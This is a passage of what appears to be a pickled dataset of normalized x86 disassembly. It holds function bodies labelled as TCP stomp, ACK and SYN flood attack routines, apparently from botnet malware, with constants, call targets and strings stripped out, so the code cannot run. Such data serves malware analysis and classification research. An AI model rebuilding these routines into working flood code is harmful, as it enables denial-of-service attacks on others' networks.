H~EAX\nCALL~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~EAX,[ESP+0]\nJGE~FOO\nJMP~FOO\nMOV~EBX,[EAX+0]\nCALL~FOO\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nMOV~EDX,[ESP+0]\nLEA~ECX,[EDX+EDX*2]\nMOV~EDX,[ESP+0]\nMOV~CL,[EDX+ECX*8+0]\nAND~ECX,0\nSHR~EAX,CL\nADD~EAX,EBX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nCMP~[ESP+0],0\nMOV~[ESI+0],EAX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[ESI+0],EAX\nJNZ~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nSUB~EAX,0\nXOR~EAX,0\nMOV~[EDI+0],AX\nCMP~[ESP+0],0\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[ESI+0],AX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[EBP+0],AX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[EDI+0],EAX\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nMOV~EBX,[ESP+0]\nLEA~EAX,[EBP+0]\nPUSH~EBX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nMOV~ECX,[ESP+0]\nMOV~EAX,[ESP+0]\nADD~ECX,0\nADD~EAX,0\nMOV~[ESP+0],ECX\nMOV~[ESP+0],EAX\nJMP~FOO"'
p41
L1238L
tp42
a(S'attack_tcp_stomp'
p43
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nXOR~EAX,EAX\nMOV~AL,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~BL,[ESP+0]\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~EAX\nCALL~FOO\nAND~EBX,0\nMOV~[ESP+0],EAX\nPOP~EDI\nPOP~EBP\nPUSH~0\nMOV~ECX,[ESP+0]\nPUSH~ECX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nPUSH~0\nMOV~EDI,EAX\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nMOV~EDX,[ESP+0]\nPUSH~EDX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],DI\nMOV~[ESP+0],0\nTEST~EAX,EAX\nJLE~FOO\nMOV~EDX,[ESP+0]\nADD~EDX,0\nMOV~[ESP+0],EDX\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EDI,EAX\nCMP~EAX,0\nJZ~FOO\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nOR~AH,0\nPUSH~EAX\nPUSH~0\nPUSH~EDI\nCALL~FOO\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],0\nADD~ESP,0\nLEA~EAX,[EAX+EAX*2]\nLEA~EAX,[ECX+EAX*8]\nCMP~[EAX+0],0\nJBE~FOO\nMOV~EAX,[EAX+0]\nMOV~[ESP+0],EAX\nCMP~[ESP+0],0\nJZ~FOO\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[ESP+0],AX\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~EDI\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nMOV~EBX,EAX\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nSUB~EAX,EBX\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nMOV~[ESP+0],0\nPUSH~EAX\nPUSH~EAX\nLEA~EDX,[ESP+0]\nPUSH~EDX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nPUSH~0\nPUSH~0\nLEA~EBP,[ESP+0]\nPUSH~EBP\nMOV~EBP,[ESP+0]\nPUSH~EBP\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nMOV~ECX,[ESP+0]\nCMP~[ESP+0],ECX\nJNZ~FOO\nCMP~EAX,0\nJBE~FOO\nMOV~EBP,[ESP+0]\nCMP~BP,[ESP+0]\nJNZ~FOO\nMOV~DL,[ESP+0]\nMOV~AL,DL\nAND~EAX,0\nCMP~AL,0\nJZ~FOO\nAND~EDX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nPUSH~EDI\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN\nCALL~FOO\nMOV~[ESP+0],AX\nJMP~FOO\nMOV~EBX,[EAX+0]\nCALL~FOO\nROR~BX,0\nROR~EBX,0\nROR~BX,0\nMOV~EDX,[ESP+0]\nMOV~EBP,[ESP+0]\nXOR~ECX,ECX\nLEA~EDX,[EDX+EDX*2]\nMOV~CL,[EBP+EDX*8+0]\nSHR~EAX,CL\nADD~EAX,EBX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[ESP+0],EAX\nJMP~FOO\nMOV~EBX,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~EDX,EBX\nSUB~ESP,0\nSHL~EDX,0\nADD~EDX,EDI\nMOV~[EDX],ECX\nMOV~EAX,[ESI+0]\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[EDX+0],EAX\nMOV~EAX,[ESI+0]\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[EDX+0],EAX\nMOV~AX,[ESI+0]\nMOV~[EDX+0],AX\nMOV~[EDX+0],BP\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~EBX,[EDX+EAX*4]\nMOV~BYTEPTR[EBX],0\nLEA~ESI,[EBX+0]\nMOV~CL,[ESP+0]\nMOV~[EBX+0],CL\nMOV~EAX,[ESP+0]\nADD~EAX,0\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~AL,[ESP+0]\nADD~ESP,0\nMOV~[EBX+0],AL\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~EAX,<STR>\nMOV~ECX,[ESP+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[ESP+0]\nSHL~EAX,0\nMOV~EDX,[EAX+ECX]\nMOV~[EBX+0],EDX\nMOV~EDX,[EAX+ECX+0]\nMOV~[EBX+0],DX\nMOV~DX,[EAX+ECX+0]\nMOV~[ESI+0],DX\nMOV~EDX,[EAX+ECX+0]\nMOV~[ESI+0],EDX\nMOV~EAX,[EAX+ECX+0]\nMOV~[ESI+0],EAX\nMOV~AL,[ESI+0]\nAND~EAX,0\nOR~[ESI+0],0\nOR~EAX,0\nMOV~[ESI+0],AL\nCALL~FOO\nMOV~CL,[ESP+0]\nMOV~DL,[ESP+0]\nMOV~[ESI+0],AX\nAND~ECX,0\nMOV~AL,[ESI+0]\nSHL~ECX,0\nAND~EAX,0\nAND~EDX,0\nOR~EAX,ECX\nSHL~EDX,0\nMOV~CL,[ESP+0]\nOR~EAX,EDX\nAND~ECX,0\nMOV~DL,[ESP+0]\nAND~EAX,0\nSHL~ECX,0\nAND~EDX,0\nSHL~EDX,0\nOR~EAX,ECX\nOR~EAX,EDX\nMOV~DL,[ESP+0]\nAND~EDX,0\nMOV~CL,[ESP+0]\nADD~EDX,EDX\nAND~EAX,0\nAND~ECX,0\nOR~EAX,EDX\nOR~EAX,ECX\nMOV~[ESI+0],AL\nPUSH~EAX\nPUSH~EAX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nCMP~EAX,[ESP+0]\nJL~FOO\nMOV~EAX,[ESP+0]\nMOV~EBP,[ESP+0]\nADD~EAX,0\nADD~EBP,0\nMOV~[ESP+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],EBP\nTEST~EAX,EAX\nNOP\nLEA~ESI,[ESI+0]\nJLE~FOO\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],0\nADD~EAX,0\nXOR~EDX,EDX\nROR~AX,0\nMOV~EBP,EAX\nAND~EBP,0\nMOV~EAX,[ESP+0]\nCMP~[ESP+0],0\nMOV~ESI,[EAX+EDX*4]\nLEA~EDI,[ESI+0]\nJZ~FOO\nCMP~[ESP+0],0\nJNZ~FOO\nMOV~[ESI+0],0\nPUSH~EBX\nPUSH~EBX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~ECX,[ESP+0]\nMOV~EBX,[ESP+0]\nSHL~ECX,0\nMOV~[ESI+0],AX\nADD~EBX,ECX\nMOV~[EDI+0],0\nMOV~EAX,[EBX+0]\nLEA~EDX,[EAX+0]\nMOV~[EBX+0],EDX\nMOV~EDX,[ESP+0]\nROR~AX,0\nAND~EAX,0\nMOV~[EDI+0],EAX\nMOV~EAX,[ECX+EDX+0]\nMOV~ECX,[ESP+0]\nROR~AX,0\nAND~EAX,0\nMOV~[EDI+0],EAX\nPUSH~ECX\nPUSH~EBP\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[EDI+0],AX\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~DX,[EDI+0]\nLEA~EAX,[EAX+EAX*2]\nADD~ESP,0\nSHL~EAX,0\nMOV~[EAX+ECX+0],DX\nADD~EAX,ECX\nPUSH~0\nPUSH~EAX\nPUSH~0\nMOV~EDX,[ESP+0]\nPUSH~EDX\nPUSH~ESI\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EDX,[ESP+0]\nINC~EDX\nMOV~[ESP+0],EDX\nADD~ESP,0\nCMP~EDX,[ESP+0]\nJGE~FOO\nJMP~FOO\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nADD~EDX,0\nADD~ECX,0\nMOV~[ESP+0],EDX\nMOV~[ESP+0],ECX\nMOV~EAX,[ESP+0]\nTEST~EAX,EAX\nJLE~FOO\nJMP~FOO\nPUSH~EAX\nPUSH~EAX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nCALL~FOO\nMOV~[ESI+0],AX\nJMP~FOO"'
p44
L1611L
tp45
a(S'attack_tcp_ack'
p46
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nXOR~EAX,EAX\nMOV~EDI,[ESP+0]\nMOVZX~ESI,[ESP+0]\nPUSH~0\nAND~ESI,0\nMOV~AL,[ESP+0]\nMOV~[ESP+0],EAX\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nPUSH~0\nMOV~EBP,EAX\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nMOV~EAX,<STR>\nPUSH~EAX\nPUSH~0\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~EAX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],AX\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],DX\nMOV~[ESP+0],CX\nMOV~[ESP+0],0\nTEST~EAX,EAX\nJLE~FOO\nMOV~DL,[ESP+0]\nMOV~ECX,[ESP+0]\nADD~ECX,0\nMOV~[ESP+0],DL\nAND~EDX,0\nMOV~[ESP+0],CX\nMOV~[ESP+0],DL\nMOV~CL,[ESP+0]\nMOV~DL,[ESP+0]\nAND~ECX,0\nAND~EDX,0\nMOV~EAX,[ESP+0]\nMOV~[ESP+0],DL\nMOV~[ESP+0],CL\nMOV~DL,[ESP+0]\nMOV~CL,[ESP+0]\nMOV~[ESP+0],AX\nAND~EDX,0\nMOV~EAX,EBP\nAND~ECX,0\nAND~EAX,0\nMOV~EDI,EDX\nMOV~EBP,ECX\nMOV~[ESP+0],AL\nSHL~EDI,0\nXOR~EBX,EBX\nSHL~EBP,0\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~EBX,[EDX+EAX*4]\nMOV~BYTEPTR[EBX],0\nLEA~ESI,[EBX+0]\nMOV~CL,[ESP+0]\nMOV~[EBX+0],CL\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~AL,[ESP+0]\nADD~ESP,0\nMOV~[EBX+0],AL\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[EBX+0],EDX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~EAX,[ECX+EAX*8+0]\nMOV~[EBX+0],EAX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[ESI+0],AX\nMOV~AX,[ESP+0]\nROR~AX,0\nAND~EAX,0\nMOV~[ESI+0],EAX\nMOV~AL,[ESI+0]\nAND~EAX,0\nOR~EAX,0\nMOV~[ESI+0],AL\nMOV~AL,[ESI+0]\nAND~EAX,0\nMOV~CL,[ESP+0]\nOR~EAX,EDI\nMOV~DL,[ESP+0]\nSHL~ECX,0\nOR~EAX,EBP\nSHL~EDX,0\nAND~EAX,0\nOR~EAX,ECX\nOR~EAX,EDX\nMOV~DL,[ESP+0]\nADD~EDX,EDX\nAND~EAX,0\nOR~EAX,EDX\nOR~AL,[ESP+0]\nMOV~[ESI+0],AL\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[ESI+0],AX\nJZ~FOO\nOR~[ESI+0],0\nPUSH~EAX\nPUSH~EAX\nMOV~ESI,[ESP+0]\nLEA~EAX,[EBX+0]\nPUSH~ESI\nPUSH~EAX\nCALL~FOO\nMOV~EBX,[ESP+0]\nINC~EBX\nMOV~[ESP+0],EBX\nADD~ESP,0\nCMP~[ESP+0],EBX\nJG~FOO\nMOV~EAX,[ESP+0]\nMOV~EDX,[ESP+0]\nADD~EAX,0\nMOV~ECX,[ESP+0]\nMOV~[ESP],EAX\nLEA~EBX,[EDX+0]\nTEST~ECX,ECX\nJLE~FOO\nMOV~EBP,[ESP+0]\nMOV~[ESP+0],0\nADD~EBP,0\nXOR~EAX,EAX\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~ESI,[EDX+EAX*4]\nLEA~EAX,[EAX+EAX*2]\nLEA~EAX,[ECX+EAX*8]\nLEA~EDI,[ESI+0]\nCMP~[EAX+0],0\nJBE~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJNZ~FOO\nMOV~[ESI+0],0\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[ESI+0],AX\nMOV~[EDI+0],0\nMOV~EAX,EBP\nROR~AX,0\nAND~EAX,0\nPUSH~EDX\nPUSH~EAX\nPUSH~EDI\nPUSH~ESI\nCALL~FOO\nMOV~[EDI+0],AX\nMOV~EAX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~DX,[EDI+0]\nLEA~EAX,[EAX+EAX*2]\nADD~ESP,0\nSHL~EAX,0\nMOV~[EAX+ECX+0],DX\nADD~EAX,ECX\nPUSH~0\nPUSH~EAX\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nADD~ESP,0\nCMP~[ESP+0],EAX\nJLE~FOO\nJMP~FOO\nMOV~ECX,[ESP+0]\nMOV~EAX,[ESP+0]\nADD~ECX,0\nMOV~[ESP],ECX\nLEA~EBX,[EAX+0]\nMOV~ECX,[ESP+0]\nTEST~ECX,ECX\nJLE~FOO\nJMP~FOO\nMOV~EAX,[EAX+0]\nMOV~[ESP+0],EAX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[ESP+0],EAX\nCALL~FOO\nMOV~EDX,[ESP+0]\nLEA~ECX,[EDX+EDX*2]\nMOV~EDX,[ESP+0]\nMOV~CL,[EDX+ECX*8+0]\nMOV~EDX,[ESP+0]\nAND~ECX,0\nSHR~EAX,CL\nADD~EAX,EDX\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nCMP~[ESP+0],0\nMOV~[ESI+0],EAX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[ESI+0],EAX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[ESI+0],AX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[ESI+0],AX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[EDI+0],AX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[EDI+0],EAX\nJNZ~FOO\nCALL~FOO\nCMP~[ESP+0],0\nMOV~[EDI+0],EAX\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nMOV~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nSUB~ESP,0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p47
L1434L
tp48
a(S'attack_tcp_syn'
p49
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nMOVZX~ESI,[ESP+0]\nPUSH~0\nAND~ESI,0\nMOV~AL,[ESP+0]\nAND~EAX,0\nPUSH~EAX\nMOV~EBP,EAX\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],AL\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~EDI,EAX\nMOV~EAX,<STR>\nPUSH~EAX\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~[ESP+0],0\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nMOV~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],DX\nMOV~EAX,[ESP+0]\nMOV~DL,[ESP+0]\nMOV~[ESP+0],CX\nMOV~[ESP+0],AX\nMOV~[ESP+0],DL\nMOV~[ESP+0],0\nTEST~EBP,EBP\nJLE~FOO\nAND~EDX,0\nMOV~AL,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[ESP+0],DL\nAND~EAX,0\nMOV~[ESP+0],CX\nMOV~[ESP+0],AL\nMOV~DL,[ESP+0]\nMOV~CL,[ESP+0]\nMOV~AL,[ESP+0]\nSHL~[ESP+0],0\nAND~EDX,0\nAND~ECX,0\nAND~EAX,0\nMOV~[ESP+0],DL\nMOV~[ESP+0],CL\nMOV~[ESP+0],AL\nAND~EDI,0\nXOR~EBX,EBX\nPUSH~ESI\nPUSH~ESI\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX+EBX*4],EAX\nMOV~EAX,[ESP+0]\nMOV~EBX,[EDX+EAX*4]\nMOV~BYTEPTR[EBX],0\nLEA~ESI,[EBX+0]\nMOV~CL,[ESP+0]\nMOV~[EBX+0],0\nMOV~[EBX+0],CL\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~AL,[ESP+0]\nADD~ESP,0\nMOV~[EBX+0],AL\nCMP~[ESP+0],0\nJZ~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~[EBX+0],EDX\nMOV~EAX,[ESP+0]\nLEA~EAX,[EAX+EAX*2]\nMOV~EAX,[ECX+EAX*8+0]\nMOV~[EBX+0],EAX\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[EBX+0],AX\nMOV~EAX,[ESP+0]\nROR~AX,0\nMOV~[ESI+0],AX\nMOV~AX,[ESP+0]\nROR~AX,0\nAND~EAX,0\nMOV~[ESI+0],EAX\nMOV~AL,[ESI+0]\nAND~EAX,0\nOR~EAX,0\nMOV~[ESI+0],AL\nMOV~AL,[ESI+0]\nAND~EAX,0\nMOV~DL,[ESP+0]\nOR~AL,[ESP+0]\nMOV~CL,[ESP+0]\nSHL~EDX,0\nSHL~ECX,0\nOR~EAX,EDX\nAND~EAX,0\nMOV~DL,[ESP+0]\nSHL~EDX,0\nOR~EAX,ECX\nOR~EAX,EDX\nMOV~DL,[ESP+0]\nADD~EDX,EDX\nAND~EAX,0\nOR~EAX,EDX\nOR~EAX,EDI\nMOV~[ESI+0],AL\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nCALL~FOO\nMOV~[EBX+0],0\nAND~EAX,0\nMOV~[EBX+0],0\nADD~EAX,0\nMOV~[EBX+0],0\nROR~AX,0\nMOV~[EBX+0],0\nMOV~[EBX+0],AX\nCALL~FOO\nMOV~[EBX+0],0\nMOV~[EBX+0],EAX\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~[EBX+0],0\nMOV~EBX,[ESP+0]\nINC~EBX\nMOV~[ESP+0],EBX\nCMP~EBP,EBX\nJG~FOO\nTEST~EBP,EBP\nJLE~FOO\nMOV~[ESP+0],0\nXOR~EAX,EAX\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~ESI,[EDX+EAX*4]\nLEA~EAX,[EAX+EAX*2]\nLEA~EAX,[ECX+EAX*8]\nLEA~EDI,[ESI+0]\nCMP~[EAX+0],0\nJBE~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJNZ~FOO\nMOV~[ESI+0],0\nPUSH~ECX\nPUSH~ECX\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~[ESI+0],AX